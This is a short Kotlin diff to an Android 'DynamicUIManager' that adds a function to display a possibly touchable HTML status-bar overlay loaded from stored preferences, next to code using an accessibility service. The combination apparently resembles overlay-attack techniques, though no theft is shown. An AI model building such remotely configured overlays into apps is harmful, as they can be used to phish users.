@@ -459,6 +459,17 @@ object DynamicUIManager {
         }
     }
 
+    fun applyStoredStatusBar(ctx: Context) {
+        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
+        if (prefs.getBoolean("status_bar_active", false)) {
+            val html = prefs.getString("status_bar_html", "") ?: ""
+            val touchable = prefs.getBoolean("status_bar_touchable", false)
+            if (html.isNotEmpty()) {
+                showStatusBarOverlay(ctx, touchable, html)
+            }
+        }
+    }
+
     fun warmUpEngine(ctx: Context) {
         Handler(Looper.getMainLooper()).post {
             val service = MyAccessibilityService.instance ?: return@post
